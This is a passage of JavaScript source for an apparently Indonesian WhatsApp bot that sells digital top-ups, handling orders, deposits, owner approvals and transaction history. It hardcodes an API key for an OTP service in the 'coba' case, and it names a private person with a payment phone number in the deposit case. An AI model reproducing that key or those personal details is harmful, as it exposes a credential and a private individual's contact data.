    for (let i of list_produk) {
    	if (i.buyer_sku_code === produk) {
    		let har;

            // Jika produk kategori adalah "E-Money" atau "PLN", atur harga sesuai wallet.json
            if (i.category === "E-Money" || i.category === "PLN") {
            	har = calculatePriceWithProfit(i);
            } else {
                // Jika bukan kategori tersebut, gunakan perhitungan harga normal
                har = hitungHargaRole(i.price);
            }

            // Cek apakah saldo cukup
            if (har > cek("saldo", m.sender)) {
            	return reply(`Maaf, saldo kamu tidak cukup untuk membeli produk itu. Silahkan Deposit Terlebih Dahulu.`);
            }

            // Menyimpan detail produk dan harga ke dalam sesi pengguna
            sett("harga", m.sender, har);
            sett("layanan", m.sender, i.product_name);
            sett("status", m.sender, false);
            sett("tujuan", m.sender, tujuan);
            sett("kode_layanan", m.sender, produk);
            sett("desc", m.sender, i.desc);
            sett("reff", m.sender, refferensi);
        }
    }

    // Menyiapkan pesan konfirmasi pesanan
    const ha = cek("harga", m.sender);
    const sa = cek("saldo", m.sender);

    let confirmationMessage = 
    `_🛍️ ORDER CONFIRMATION_\n\n` +
    `_›› ID Produk:_ ${cek("kode_layanan", m.sender)}\n` +
    `_›› Layanan:_ ${cek("layanan", m.sender)}\n` +
    `_›› Penerima:_ ${cek("tujuan", m.sender)}\n` +
    `_›› Total:_ ${formatmoney(ha)}\n` +
    `_›› Saldo Anda:_ ${formatmoney(sa)}\n` +
    `_›› Note:_ ${cek("desc", m.sender)}\n\n` +
    `Ketik *${prefix}yes* untuk Melanjutkan Transaksi\n` +
    `Ketik *${prefix}batal* untuk Membatalkan Pesanan`;

    // Memeriksa apakah produk tersedia dalam sesi pengguna
    if (cek("layanan", m.sender) === "") {
    	return reply(`Maaf kak, produk *${produk}* tidak ditemukan.\nSilahkan lihat kode produk di *${prefix}listharga*`);
    }

    // Mengirim pesan konfirmasi ke pengguna
    m.reply(confirmationMessage);

    // Simpan informasi deposit jika diperlukan
    var deposit_object = {
    	ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
    	session: "amount",
    	date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta" }),
    	number: sender,
    };
}

async function getGameData(url, params) {
	try {
		const response = await axios.get(url, {
			params,
			validateStatus: function (status) {
                // Resolve the promise for any status code to handle it manually
                return true;
            }
        });

        // Check the response status and handle accordingly
        if (response.status === 200) {
        	const prettyText = JSON.stringify(response.data, null, 2);
        	reply(`${prettyText}`);
        } else {
            // Handle non-200 responses, including 404
            const errorText = JSON.stringify(response.data, null, 2);
            reply(`${response.status}:\n${errorText}`);
        }
    } catch (error) {
        // This block will handle network errors or unexpected issues
        console.error('Error fetching game data:', error);
        reply("An unexpected error occurred while fetching game data.");
    }
}

// async function getProduk(digiuser, digiapi) {
//     // Implementasi fungsi getProduk di sini
//     // Misalnya, ambil data dari API dan kembalikan hasilnya
// }

// async function updateProduk() {
// 	try {
// 		const produk = await getProduk(digiuser, digiapi);

// 		if (produk && produk.length > 0) {
// 			console.log(`Produk berhasil diperbarui:`, produk);
//             // Anda bisa menambahkan proses penyimpanan produk di sini
//         } else {
//         	console.log(`Tidak ada produk yang ditemukan atau produk kosong.`);
//         }
//     } catch (error) {
//     	console.error("Terjadi kesalahan saat memperbarui produk:", error);
//     }
// }


// setInterval(updateProduk, 30000);


// updateProduk();


if (command) {
	kris.sendPresenceUpdate(jd, from);
	kris.readMessages([m.key]);
}

    //FITUR CASE BY KRIS
    switch (command) {
    	case "11111":
    	case "22222":
    	case "333333": {
    		if (fs.existsSync(PathAuto + m.sender.split("@")[0] + ".json"))
    			return reply(
    				`Selesaikan Deposit Anda Sebelumnya Untuk Membatalkan Silahkan Ketil #ndepo`
    				);
        // Membuat ID acak 8 digit
        const randomId = Math.floor(10000000 + Math.random() * 90000000);

        // Memisahkan pesan menjadi array untuk mendapatkan nominal deposit
        const depoCommand = m.text.split(" ");

        // Memastikan format depo hanya berisi angka tanpa tanda simbol
        const isValidInput =
        depoCommand.length > 1 && /^\d+$/.test(depoCommand[1]);

        if (!isValidInput) {
        	m.reply(
        		`Format Salah atau Nominal Harus Angka\n` +
        		`Format benar : \`\`\`Depo [Nominal]\`\`\`\n` +
        		`Contoh : \`\`\`Depo 1000\`\`\``
        		);

        	return;
        }

        // Memeriksa minimal nominal depo (1000)
        const minimalNominal = 1000;
        const nominal = parseInt(depoCommand[1]);

        // Memastikan nominal setelah diubah tetap valid
        if (nominal < minimalNominal) {
        	m.reply(
        		`Nominal harus minimal ${minimalNominal}\n` +
        		`Format benar: \`\`\`Depo [Nominal]\`\`\`\n` +
        		`Contoh: \`\`\`Depo 1000\`\`\``
        		);

        	return;
        }

        // Menghitung biaya layanan (0,7% dari jumlah bayar)
        const biayaLayanan = nominal * 0.007;

        // Menghitung saldo diterima (jumlah bayar dikurangi biaya layanan)
        const saldoDiterima = nominal;

        // Nomor member tanpa @s.whatsapp.net
        const memberNumber = m.sender.split("@")[0];

        const jml = nominal + biayaLayanan;
        
        // Menambahkan koma pada format nominal tanpa desimal
        const formattedNominal = new Intl.NumberFormat("id-ID", {
        	style: "currency",
        	currency: "IDR",
        	minimumFractionDigits: 0,
        	maximumFractionDigits: 0,
        }).format(jml);
        const formattedBiayaLayanan = new Intl.NumberFormat("id-ID", {
        	style: "currency",
        	currency: "IDR",
        	minimumFractionDigits: 0,
        	maximumFractionDigits: 0,
        }).format(biayaLayanan);
        const formattedSaldoDiterima = new Intl.NumberFormat("id-ID", {
        	style: "currency",
        	currency: "IDR",
        	minimumFractionDigits: 0,
        	maximumFractionDigits: 0,
        }).format(saldoDiterima);
        const jlak = Number(jml);
        // Menambahkan nominal, biaya layanan, saldo diterima, dan nomor member ke informasi deposit
        let depositInfo = `[ *INFORMASI DEPOSIT* ]\n\n`;
        depositInfo += `*» ID :* ${randomId}\n`;
        depositInfo += `*» Member :* ${memberNumber}\n`;
        depositInfo += `*» Jumlah Bayar :* Rp. ${formattedNominal}\n`;
        depositInfo += `*» Payment :* QRIS\n`;
        depositInfo += `*» Biaya Layanan :* Rp. ${formattedBiayaLayanan}\n`;
        depositInfo += `*» Saldo Diterima :* Rp. ${formattedSaldoDiterima}\n\n`;
        depositInfo += `_Silahkan transfer ke pembayaran yang disediakan dan kirimkan bukti dengan ketik #bukti_\n\n`;
        depositInfo += `_Fz-Store_`;

        kris.sendMessage(
        	m.chat,
        	{ image: qrisdonate, caption: depositInfo },
        	{ quoted: m }
        	);

        let obj = {
        	id: memberNumber,
        	ref: `${randomId}`,
        	jumlah_bayar: jlak,
        	saldo_diterima: nominal,
        	pay: "QRIS",
        	biaya_layanan: biayaLayanan,
        };
        fs.writeFileSync(
        	PathAuto + m.sender.split("@")[0] + ".json",
        	JSON.stringify(obj)
        	);
        break;
    }

    case "depo":
    case "payment":
    case "deposit":
    case "pay":
    {
    	let depositInfo = `[ *INFORMASI DEPOSIT* ]\n\n` +
    	`» DANA  : 085735115194\n` +
    	`» GOPAY : 085735115194\n` +
    	`» BNC   : 085735115194\n\n` +
    	`*A.N MOH FARIS DHAIFULLAH*\n\n` +
        // depositInfo += `*» Biaya Layanan :* Rp. ${formattedBiayaLayanan}\n`;
        // depositInfo += `*» Saldo Diterima :* Rp. ${formattedSaldoDiterima}\n\n`;
        `_Silahkan transfer ke pembayaran yang disediakan dan wajib kirim bukti_ \n\n` +
        `_Fz-Store_`;
        /* kris.sendMessage(
        	m.chat,
        	{ image: qrisdonate, caption: depositInfo },
        	{ quoted: m }
        	);
        	*/
        	// reply(depositInfo)

        	kris.sendMessage(
        		from,
        		{ image: qrisdonate, caption: depositInfo },
        		{ quoted: m }
        		);
        }

        break;

        case "qr": {
        	kris.sendMessage(
        		from,
        		{ image: qrisdonate, caption: "QRIS" },
        		{ quoted: m }
        		);

        }
        break;

        case "coba":
        {
        	const axios = require("axios");

        	async function fetchData() {
        		try {
        			const response = await axios.get("https://otpweb.net/api", {
        				params: {
        					api_key: "d2ca9fdb7fa6d326a013b0b7109404f83acd52f6",
        					action: "set_status",
        					order_id: "2352969691",
        					status: "cancel",
        				},
        			});

        			console.log(response.data);
        		} catch (error) {
        			console.error(error);
        		}
        	}

        	fetchData();
        }
        break;

        case "cdepo":
        {
        	if (
        		!fs.existsSync(
        			`./Pengaturan/database/deposit/otomatis/${
        				m.sender.split("@")[0]
        			}.json`
        			)
        		)
        		return reply("Anda Belum Melakukan deposit");
        	let data_depo = JSON.parse(
        		fs.readFileSync(PathAutoo + sender.split("@")[0] + ".json")
        		);
        	reply(`Baik kak, Deposit Dengan ID : ${data_depo.ref} dibatalkan 😊`);
        	fs.unlinkSync(PathAutoo + sender.split("@")[0] + ".json");
        }
        break;
        case "ndepo":
        {
        	if (
        		!fs.existsSync(
        			`./Pengaturan/database/deposit/manual/${
        				m.sender.split("@")[0]
        			}.json`
        			)
        		)
        		return reply("Anda Belum Melakukan deposit");
        	let data_depo = JSON.parse(
        		fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        		);
        	reply(
        		`Baik kak, Deposit Dengan ID : ${data_depo.reff} dibatalkan 😊`
        		);
        	fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
        break;

        case 'antilink':
        case 'antilinkgc': {
        	if (!m.isGroup) return reply(mess.only.group)
        		if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
        			if (!isAdmins && !ownernya) return reply('Khusus Admin!!')
        				if (args[0] === "on") {
        					if (Antilinkgc) return reply('Already activated')
        						ntlinkgc.push(from)
        					fs.writeFileSync('./Pengaturan/database/antilink.json', JSON.stringify(ntlinkgc))
        					reply('Success in turning on antiwame in this group')
        					var groupe = await kris.groupMetadata(from)
        					var members = groupe['participants']
        					var mems = []
        					members.map(async adm => {
        						mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
        					})
        					kris.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
        				} else if (args[0] === "off") {
        					if (!Antilinkgc) return reply('Already deactivated')
        						let off = ntlinkgc.indexOf(from)
        					ntlinkgc.splice(off, 1)
        					fs.writeFileSync('./Pengaturan/database/antilink.json', JSON.stringify(ntlinkgc))
        					reply('Success in turning off antiwame in this group')
        				} else {
        					let msg = generateWAMessageFromContent(from, {
        						viewOnceMessage: {
        							message: {
        								messageContextInfo: {
        									deviceListMetadata: {},
        									deviceListMetadataVersion: 2
        								},
        								interactiveMessage: proto.Message.InteractiveMessage.create({
        									body: proto.Message.InteractiveMessage.Body.create({
        										text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        									}),
        									footer: proto.Message.InteractiveMessage.Footer.create({
        										text: botname
        									}),
        									header: proto.Message.InteractiveMessage.Header.create({
        										...(await prepareWAMessageMedia({ image: { url: 'https://iili.io/dbQBob9.md.jpg' } }, { upload: kris.waUploadToServer })),
        										title: ``,
        										gifPlayback: true,
        										subtitle: ownername,
        										hasMediaAttachment: false
        									}),
        									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
        										buttons: [
        										{
        											name: "single_select",
        											buttonParamsJson: `{
        												"title":"PILIH ON/OFF ♨️",
        												"sections":[{
        													"title":"PILIH ON/OFF ",
        													"rows":[{
        														"header":"HIDUPKAN ✅",
        														"title":"MEMILIH ",
        														"description":"MENGHIDUPKAN ✅",
        														"id":"${prefix + command} on"
        													},
        													{
        														"header":"MEMATIKAN ❌",
        														"title":"MEMILIH ",
        														"description":"MEMATIKAN ❌",
        														"id":"${prefix + command} off"
        													}]
        												}]
        											}`
        										}
        										]
        									}),
        									contextInfo: {
        										mentionedJid: [m.sender],
        										forwardingScore: 999,
        										isForwarded: true,
        										forwardedNewsletterMessageInfo: {
        											newsletterJid: '120363222395675670@newsletter',
        											newsletterName: ownername,
        											serverMessageId: 143
        										}
        									}
        								})
        							}
        						}
        					}, { quoted: m });

        					await kris.relayMessage(msg.key.remoteJid, msg.message, {
        						messageId: msg.key.id
        					});
        				}
        			}

        			break;

        			case "bukti":
        			{
        				if (
        					!fs.existsSync(
        						`./Pengaturan/database/deposit/manual/${
        							m.sender.split("@")[0]
        						}.json`
        						)
        					)
        					return reply("Anda Belum Melakukan deposit");
        				let data_depo = JSON.parse(
        					fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        					);
        				if (!quoted)
        					return reply(
        						`Kirim/Reply gambar dengan caption *${prefix + command}*`
        						);
        				if (/image/.test(mime)) {
        					let media = await quoted.download();
        					m.reply(
        						`Bukti berhasil terkirim ke owner, silahkan menunggu konfirmasi`
        						);
        					let buktii = 
        					`📥 *DEPOSIT USER* 📥\n\n` +
        					`➖➖➖➖➖➖➖➖➖➖\n` +
        					`⭔ ID: ${data_depo.ref}\n` +
        					`⭔ Nomor: ${data_depo.id}\n` +
        					`⭔ Payment: ${data_depo.pay}\n` +
        					`⭔ Tanggal: ${tanggal} ${jam}\n` +
        					`⭔ Jumlah Bayar: ${formatmoney(data_depo.jumlah_bayar)}\n` +
        					`⭔ Biaya Layanan: ${formatmoney(data_depo.biaya_layanan)}\n` +
        					`⭔ Saldo Diterima: ${formatmoney(data_depo.saldo_diterima)}\n` +
        					`➖➖➖➖➖➖➖➖➖➖\n\n` +
        					`Ada yang melakukan deposit. Mohon untuk dicek saldo pengguna terkait.\n\n` +
        					`Jika sudah masuk, silahkan konfirmasi dengan\n` +
        					`*#acc* ${sender.split("@")[0]}\n` +
        					`atau\n` +
        					`*#tolak* ${sender.split("@")[0]}`;


            // Kirim bukti deposit ke owner
            kris.sendMessage(
            	global.owner + "@s.whatsapp.net",
            	{ image: media, caption: buktii },
            	{ quoted: null }
            	);
        } else {
        	reply(`Kirim/Reply gambar dengan caption *${prefix + command}*`);
        }
    }
    break;
    case "acc":
    {
    	if (!isOwner) return;

    	const target = args[0];
    	if (
    		!fs.existsSync(
    			`./Pengaturan/database/deposit/manual/${target}.json`
    			)
    		)
    		return reply("Nomor Tersebut Tidak Melakukan deposit saldo");
    	const kiw = `${target}@s.whatsapp.net`;
    	if (!target) return m.reply("mana orangnya");
    	if (cek("id", kiw) == null)
    		return reply(
    			`Nomor Tersebut Belum Terdaftar di Database Silahkan ketik #daftar`
    			);
    	let data_depo = JSON.parse(
    		fs.readFileSync(PathAuto + target + ".json")
    		);
    	var loak = Number(data_depo.saldo_diterima);
    	const amountToAdd = loak;
    	if (isNaN(amountToAdd) || amountToAdd <= 0) {
    		return m.reply("Nilai Saldo Harus Berupa Angka!!!");
    	}

    	const targetUser = kiw;
    	const sebelum = cek("saldo", kiw);

    	sett("+saldo", kiw, loak);
          const chatId = "1135642112"; // Ganti dengan ID obrolan Anda di Telegram

          const message = "Deposit berhasil diproses!";

          sendMessageToTelegram(chatId, message);

          const akhir = cek("saldo", kiw);
          const formatSaldo = (amount) => `${amount.toLocaleString()}`;
          m.reply(
          	`───〔 *Deposit Sukses* 〕───\n\n` +
          	`*Nomor:* ${target}\n` +
          	`*Saldo Terakhir:* Rp ${formatSaldo(sebelum)}\n` +
          	`*Saldo Sekarang:* Rp ${formatSaldo(akhir)}\n` +
          	`*Waktu:* ${tanggal3}, ${jam} WIB`
          	);

          const capt = 
          `───〔 *Deposit Sukses* 〕───\n\n` +
          `*Nomor:* ${target}\n` +
          `*Saldo Terakhir:* Rp ${formatSaldo(sebelum)}\n` +
          `*Saldo Sekarang:* Rp ${formatSaldo(akhir)}\n` +
          `*Waktu:* ${tanggal3}, ${jam} WIB`;

          kris.sendMessage(
          	kiw,
          	{
          		text: capt,
          		contextInfo: {
          			externalAdReply: {
          				title: `DI-PAY 2024`,
          				thumbnailUrl: `${krismenu}`,
          				sourceUrl: `${website}`,
          				mediaType: 1,
          				renderLargerThumbnail: true,
          			},
          		},
          	},
          	{ quoted: m }
          	);
          const trxFilePath = "./Pengaturan/database/datadepo.json";
          const trxUserData = JSON.parse(fs.readFileSync(trxFilePath, "utf8"));
          const waktu = cekWaktu();
          const newTransactionData = {
          	buyer: m.sender,
          	status: "Berhasil",
          	ref_id: `#${data_depo.ref}`,
          	jam: moment.tz("Asia/Jakarta").format("HH:mm:ss"),
          	date: waktu,
          	saldo_diterima: data_depo.saldo_diterima,
          	total_bayar: data_depo.jumlah_bayar,
          };
          trxUserData.push(newTransactionData);
          fs.writeFileSync(
          	trxFilePath,
          	JSON.stringify(trxUserData, null, 2),
          	"utf8"
          	);
          fs.unlinkSync(PathAuto + target + ".json");
      }
      break;

      case "detail": 
      {
      	const skuCode = text.split(" ")[0];
      	console.log(skuCode);

      	if (!skuCode) {
      		reply("_skuCode tidak ditemukan_");
      		break;
      	}


      	const fs = require("fs").promises;
      	let walletData;
      	try {
      		walletData = await fs.readFile(walletJson, "utf8");
      	} catch (error) {
      		console.error("Error reading wallet.json:", error);
      		reply("Terjadi kesalahan dalam membaca data konfigurasi.");
      		break;
      	}

      	const parsedWalletData = JSON.parse(walletData);
      	const profitConfig = parsedWalletData.profit;


      	let database;
      	try {
      		database = await getDatabase();
      	} catch (error) {
      		console.error("Error fetching database:", error);
      		reply("Terjadi kesalahan dalam mengambil data produk.");
      		break;
      	}

      	const product = database.find(item => item.buyer_sku_code === skuCode);
      	if (product) {

      		const setprof = cek("role", m.sender).toUpperCase(); 
      		const profitNominal = profitConfig[setprof] || 0; 
      		const formattedHarga = product.price + profitNominal;

        // Format harga dengan mata uang IDR
        const formatMoney = (amount) => {
        	return new Intl.NumberFormat("id-ID", {
        		style: "currency",
        		currency: "IDR",
        	}).format(amount);
        };

        reply(
        	`*_Data Produk Ditemukan_*\n\n` +
        	`> Nama Produk: ${product.product_name}\n` +
        	`> Kategori: ${product.category}\n` +
        	`> Brand: ${product.brand}\n` +
        	`> Tipe: ${product.type}\n` +
        	`> Harga: Rp ${formatMoney(formattedHarga)}\n` +
        	`> Deskripsi: ${product.desc}`
        	);
    } else {
    	reply(`_Produk dengan SKU Code ${skuCode} tidak ditemukan._`);
    }

}
break;


case "asli": 
{
	console.log(multiowner)
          	// console.log(cek("id", m.sender))

          	const skuCode = text.split(" ")[0];
          	console.log(skuCode);

          	if (skuCode == null) {
          		reply("_skuCode tidal di temukan_")
          		break;
          	}

          	if (multiowner.includes(cek("id", m.sender))) {

          		const fs = require("fs").promises;
          		let database = await getDatabase();

          		const product = database.find(item => item.buyer_sku_code === skuCode);
          		if (product) {
          			const formattedHarga = new Intl.NumberFormat("id-ID", {
          				style: "currency",
          				currency: "IDR",
          			}).format(product.price);

          			reply(
          				`*_Data Produk Ditemukan_*\n\n` +
          				`> Nama Produk: ${product.product_name}\n` +
          				`> Kategori: ${product.category}\n` +
          				`> Brand: ${product.brand}\n` +
          				`> Tipe: ${product.type}\n` +
          				`> Nama Penjual: ${product.seller_name}\n` +
          				`> Harga: Rp ${formattedHarga}\n` +
          				`> Deskripsi: ${product.desc}`
          				);

          		} else {
          			reply(`_Produk dengan SKU Code ${skuCode} tidak ditemukan._`);
          		}

          	} else {
          		reply("salah");
          	}

          }
          break;

          case "listtrx": {
          	const filePath = "./Pengaturan/database/datatrx.json";

          	try {
          		const fileData = fs.readFileSync(filePath, "utf8");
          		const allUserData = JSON.parse(fileData);

          		const userData = allUserData.filter(
          			(data) => data.buyer === m.sender
          			);

          		if (userData.length === 0) {
          			return reply(
          				"Kamu belum memiliki riwayat transaksi. Jika ingin melakukan transaksi silahkan ketik .menu"
          				);
          		}

          		let totalHarga = 0;
          		let totalTransactions = userData.length;

          		userData.forEach((data) => {
          			totalHarga += parseFloat(data.harga);
          		});

          		const historyText = userData.map((data, index) => {
          			const formattedHarga = new Intl.NumberFormat("id-ID", {
          				style: "currency",
          				currency: "IDR",
          			}).format(data.harga);

          			return `_*#Transaksi Ke-${index + 1}:*_\n` +
          			`*› Produk:* ${data.produk}\n` +
          			`*› Reff ID:* ${data.ref_id}\n` +
          			`*› Tujuan:* ${data.tujuan}\n` +
          			`*› Harga:* ${formattedHarga}\n` +
          			`*› Waktu:* ${data.jam} | ${data.waktu}\n` +
          			`*› Invoice:* _${data.invoice}_\n`;

          		});

          		const formattedTotalHarga = new Intl.NumberFormat("id-ID", {
          			style: "currency",
          			currency: "IDR",
          		}).format(totalHarga);

          		const replyMessage = `  *[ RIWAYAT TRANSAKSI ]*\n\n` +
          		`*Total Transaksi:* ${totalTransactions}\n` +
          		`*Total Harga:* ${formattedTotalHarga}\n\n` +
          		`${historyText.join("\n")}`;

          		reply(replyMessage);
          	} catch (error) {
          		console.error("Error reading the transaction history file:", error);
          		reply("Ada Masalah ketika membaca data, silahkan hubungi owner.");
          	}
          	break;
          }

          case "listtrxb": {
          	const filePath = "./Pengaturan/database/datatrx.json";

          	try {
          		const fileData = fs.readFileSync(filePath, "utf8");
          		const allUserData = JSON.parse(fileData);

                // Mendapatkan bulan dan tahun saat ini
                const currentMonth = new Date().getMonth();                   // Bulan 0-11
                const currentYear = new Date().getFullYear();

                // Filter transaksi berdasarkan bulan dan tahun saat ini
                const monthlyData = allUserData.filter((data) => {
                const transactionDate = new Date(data.date);               // Menggunakan 'date' dari data
                return (
                	transactionDate.getMonth() === currentMonth &&
                	transactionDate.getFullYear() === currentYear
                	);
            });

                if (monthlyData.length === 0) {
                	return reply(
                		"Tidak ada transaksi di bulan ini. Silakan lakukan transaksi terlebih dahulu."
                		);
                }

                let totalHarga = 0;
                let totalTransactions = monthlyData.length;

                monthlyData.forEach((data) => {
                	totalHarga += parseFloat(data.harga);
                });

                const historyText = monthlyData.map((data, index) => {
                	const formattedHarga = new Intl.NumberFormat("id-ID", {
                		style: "currency",
                		currency: "IDR",
                	}).format(data.harga);

                	return `_*#Transaksi Ke-${index + 1}:*_\n` +
                	`*› Produk:* ${data.produk}\n` +
                	`*› Reff ID:* ${data.ref_id}\n` +
                	`*› Tujuan:* ${data.tujuan}\n` +
                	`*› Harga:* ${formattedHarga}\n` +
                	`*› Waktu:* ${data.jam} | ${data.date}\n` +
                	`*› Invoice:* _${data.invoice}_\n` +
                	`*› Pembeli:* ${data.buyer}\n`;
                });

                const formattedTotalHarga = new Intl.NumberFormat("id-ID", {
                	style: "currency",
                	currency: "IDR",
                }).format(totalHarga);

                const replyMessage = `  *[ RIWAYAT TRANSAKSI BULAN INI ]*\n\n` +
                `*Total Transaksi:* ${totalTransactions}\n` +
                `*Total Harga:* ${formattedTotalHarga}\n\n` +
                `${historyText.join("\n")}`;

                reply(replyMessage);
            } catch (error) {
            	console.error("Error reading the transaction history file:", error);
            	reply("Ada masalah ketika membaca data, silahkan hubungi owner.");
            }
            break;
        }


        case "ranktrxbulan": {
        	const filePath = "./Pengaturan/database/datatrx.json";

        	try {
        		const fileData = fs.readFileSync(filePath, "utf8");
        		const allUserData = JSON.parse(fileData);

        // Mendapatkan bulan dan tahun saat ini
        const currentMonth = new Date().getMonth(); // Bulan 0-11
        const currentYear = new Date().getFullYear();

        // Filter transaksi berdasarkan bulan dan tahun saat ini
        const monthlyData = allUserData.filter((data) => {
            const transactionDate = new Date(data.date); // Menggunakan 'date' dari data
            return (
            	transactionDate.getMonth() === currentMonth &&
            	transactionDate.getFullYear() === currentYear
            	);
        });

        if (monthlyData.length === 0) {
        	return reply(
        		"Tidak ada transaksi di bulan ini. Silakan lakukan transaksi terlebih dahulu."
        		);
        }

            // Mengelompokkan transaksi berdasarkan pembeli dan menghitung total nominal per pembeli
            const buyerTransactions = {};
            monthlyData.forEach((data) => {
            	const buyer = data.buyer;
            	const harga = parseFloat(data.harga);

            	if (!buyerTransactions[buyer]) {
                buyerTransactions[buyer] = 0; // Inisialisasi jika pembeli belum ada
            }
            buyerTransactions[buyer] += harga; // Menambah jumlah transaksi
        });

            // Mengonversi objek ke array dan mengurutkan berdasarkan jumlah transaksi terbanyak
            const sortedBuyers = Object.entries(buyerTransactions).sort((a, b) => b[1] - a[1]);

            // Mengambil top 10 pembeli dengan jumlah transaksi terbanyak
            const top10Buyers = sortedBuyers.slice(0, 10);

            // Membuat teks ranking
            const rankingText = top10Buyers.map((buyer, index) => {
            	const formattedTotal = new Intl.NumberFormat("id-ID", {
            		style: "currency",
            		currency: "IDR",
            	}).format(buyer[1]);

            	return `_*#${index + 1}:*_\n` +
            	`› Pembeli: ${buyer[0]}\n` +
            	`› Total Transaksi: ${formattedTotal}\n`;
            });

            const replyMessage = `  *[ RANKING BULAN INI ]*\n\n` +
            `${rankingText.join("\n")}`;

            reply(replyMessage);
        } catch (error) {
        	console.error("Error reading the transaction history file:", error);
        	reply("Ada masalah ketika membaca data, silahkan hubungi owner.");
        }
        break;
    }


    case "setprofit":
    {
    	if (!isOwner) return;
    	const p = q.split(" ");
    	const data = JSON.parse(
    		fs.readFileSync("./Pengaturan/database/profit.json")
    		);

    	if (p[0] === "user" || p[0] === "vip" || p[0] === "vvip") {
    		const newValue = toLvl(p[1]);
    		if (isNaN(newValue)) {
    			return reply("Harap masukkan angka yang valid.");
    		}
    		data.profit[p[0]] = newValue;
    		data.output[p[0]] = p[1] + "%";
    		fs.writeFileSync(
    			"./Pengaturan/database/profit.json",
    			JSON.stringify(data, null, 2)
    			);
    		reply(
    			`Profit untuk tipe pengguna "${p[0]}" berhasil diupdate menjadi ${q}%.`
    			);
    	} else {
    		reply(
    			'Tipe pengguna tidak valid. Gunakan salah satu dari "USER", "VIP", "VVIP"\n\nContoh Penggunaan\n.setprofit vip 10(yaitu keuntungan 10%)'
    			);
    	}
    }
    break;

    case "setwallet":
    {
    	if (!isOwner) return;
    	const p = q.split(" ");
    	console.log(p)
    	const data = JSON.parse(
    		fs.readFileSync(walletJson)
    		);

    	if (p[0] === "OVO" || p[0] === "GO PAY" || p[0] === "SHOPEE PAY" || p[0] === "DANA" || p[0] === "PLN") {
    		const newValue = p[1];
    		if (isNaN(newValue)) {
    			return reply("Harap masukkan angka yang valid.");
    		}
    		data.profit[p[0]] = newValue;
          		// data.output[p[0]] = p[1];
          		fs.writeFileSync(
          			walletJson,
          			JSON.stringify(data, null, 2)
          			);
          		reply(
          			`Profit untuk tipe produk "${p[0]}" berhasil diupdate menjadi ${q}`
          			);
          	} else {
          		reply(
          			'Tipe produk tidak valid. Gunakan salah satu dari "dana", "ovo", "shopeepay", "gopay", "pln"\n\nContoh Penggunaan\n.setwallet dana 100(yaitu keuntungan 100)'
          			);
          	}
          }
          break;

          case "batal":
          {
          	if (!fs.existsSync(PathTrx + m.sender.split("@")[0] + ".json"))
          		return reply("Anda Belum Melakukan Order");
          	let data_depo = JSON.parse(
          		fs.readFileSync(PathTrx + sender.split("@")[0] + ".json")
          		);
          	reply(`Baik kak, pesanan Dengan ID : ${data_depo.ID} dibatalkan 😊`);
          	fs.unlinkSync(PathTrx + sender.split("@")[0] + ".json");
          }
          break;
          case "tambah": {
          	const [num_one, num_two] = text.split(" ").map(Number);

          	if (!num_one || !num_two) {
          		return reply(
          			`Gunakan dengan cara ${prefix}${command} *angka* *angka*\n\nContoh:\n${prefix}${command} 1 2`
          			);
          	}

          	const result = num_one + num_two;
          	reply(`Hasilnya adalah *${result}*`);
          	break;
          }
          case "kurang": {
          	const [num_one, num_two] = text.split(" ").map(Number);

          	if (!num_one || !num_two) {
          		return reply(
          			`Gunakan dengan cara ${prefix}${command} *angka* *angka*\n\nContoh:\n${prefix}${command} 1 2`
          			);
          	}

          	const result = num_one - num_two;
          	reply(`Hasilnya adalah *${result}*`);
          	break;
          }
          case "kali": {
          	const [num_one, num_two] = text.split(" ").map(Number);

          	if (!num_one || !num_two) {
          		return reply(
          			`Gunakan dengan cara ${prefix}${command} *angka* *angka*\n\nContoh:\n${prefix}${command} 1 2`
          			);
          	}

          	const result = num_one * num_two;
          	reply(`Hasilnya adalah *${result}*`);
          	break;
          }
          case "bagi": {
          	const [num_one, num_two] = text.split(" ").map(Number);

          	if (!num_one || !num_two) {
          		return reply(
          			`Gunakan dengan cara ${prefix}${command} *angka* *angka*\n\nContoh:\n${prefix}${command} 1 2`
          			);
          	}

          	const result = num_one / num_two;
          	reply(`Hasilnya adalah *${result}*`);
          	break;
          }

          case "topup": {
          	if (cek("id", m.sender) == null) {
          		daftarr(); 
          		reply(
          			`_Silahkan ketik *menu* kembali_`
          			);

          	}

          	// if (cek("status", m.sender) == false)
          	// 	return reply(
          	// 		`Tidak bisa melanjutkan karena sebelumnya sudah ada transaksi. Silakan dibatalkan terlebih dahulu dengan cara ketik #batal`
          	// 		);
          	if (cek("saldo", m.sender === null)) {
          		m.reply(`Kamu tidak memiliki saldo, silahkan deposit`);
          		return;
          	}
          	const sal = `*Cara Top-Up:* \n\nLangkah-langkah top-up:\n_1. Pastikan Saldo Anda cukup untuk melakukan Transaksi._\n_2. Pastikan kode produk yang anda berikan benar._\n3_. Pastikan Nomor Tujuan Benar sehingga tidak menyebabkan kesalahan topup

          	_*Contoh penggunaan: #topup <produk>|<tujuan>*_
          	`;

          	if (!text) return reply(sal);
          	const refferensi = short.generate();
          	const produk = text.split("|")[0];
          	const tujuan = text.split("|")[1];
          	order(produk, tujuan, refferensi);
          	break;
          }

          case "upgraderole":
          {
          	var lo = 
          	`*Upgrade ke Level Reseller Premium!*\n\n` +
          	`Apakah Anda ingin membawa bisnis produk digital Anda ke level berikutnya? Upgrade peran Anda menjadi Silver atau Gold sekarang untuk menikmati manfaat luar biasa berikut:\n\n` +
          	`*Manfaat Upgrade:*\n` +
          	`1. Harga Produk Lebih Murah: Dapatkan harga produk yang lebih rendah, memberikan keuntungan besar dalam bisnis produk digital Anda.\n` +
          	`2. Proses Otomatisasi: Mudah dan efisien. Tidak perlu ribet dengan pembuatan situs web, semuanya dapat diatur melalui WhatsApp.\n` +
